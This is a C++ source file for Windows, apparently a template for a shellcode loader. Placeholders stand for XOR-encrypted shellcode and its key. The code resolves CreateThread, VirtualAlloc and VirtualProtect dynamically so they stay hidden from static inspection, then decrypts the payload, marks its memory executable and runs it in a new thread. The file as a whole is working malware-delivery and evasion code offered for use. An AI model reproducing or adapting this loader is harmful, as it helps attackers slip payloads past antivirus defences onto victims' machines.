#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h> 
#include <iostream>

<SHELLCODE>

char key[] = <XOR_KEY>;
unsigned int key_len = sizeof(key);
unsigned int shellcode_len = sizeof(shellcode);

// Dynamic Invoke nonsense
typedef HANDLE(*CREATETHREAD)(LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
    );

typedef LPVOID(*VIRTUALALLOC)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef BOOL(*VIRTUALPROTECT)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
    );

void xor_data(unsigned char data[], int dataLen, char key[], int keyLen)
{
    for (int i = 0; i < dataLen; i++)
    {
        //printf("%c\n", data[i] ^ key[i % keyLen]);
        data[i] = data[i] ^ key[i % (keyLen - 1)];
    }
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    void* payloadPtr = nullptr;
    BOOL rv;
    HANDLE th;
    DWORD oldProtect = 0;
    HINSTANCE kernelHandle;
    CREATETHREAD createThread;
    VIRTUALALLOC  virtualAlloc;
    VIRTUALPROTECT virtualProtect;

    // More dynamic invoke shit
    kernelHandle = LoadLibraryA("Kernel32.dll");

    if (kernelHandle == NULL)
    {
        return 1;
    }

    // Get pointer to functions which we can invoke
    createThread = (CREATETHREAD)GetProcAddress(kernelHandle, "CreateThread");

    if (!createThread)
    {
        // handle the error
        FreeLibrary(kernelHandle);
        return 2;
    }

    virtualAlloc = (VIRTUALALLOC)GetProcAddress(kernelHandle, "VirtualAlloc");

    if (!virtualAlloc)
    {
        // handle the error
        FreeLibrary(kernelHandle);
        return 2;
    }

    virtualProtect = (VIRTUALPROTECT)GetProcAddress(kernelHandle, "VirtualProtect");

    if (!virtualProtect)
    {
        // handle the error
        FreeLibrary(kernelHandle);
        return 2;
    }

    // XOR shellcode
    xor_data(shellcode, shellcode_len, key, key_len);
    //printf("Shellcode decrypted, injecting\n");
    // Allocate memory to write payload into memory
    //printf("Allocating memory\n");
    payloadPtr = virtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy payload to memory
    //printf("Copying buffer\n");
    RtlMoveMemory(payloadPtr, shellcode, shellcode_len);

    // Change permissions to RX
    //printf("Changing to execute permissions\n");
    rv = virtualProtect(payloadPtr, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);


    if (rv != 0)
    {
        //printf("Starting thread\n");
        //Create thread at start of memory
        th = createThread(0, 0, (LPTHREAD_START_ROUTINE)payloadPtr, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}
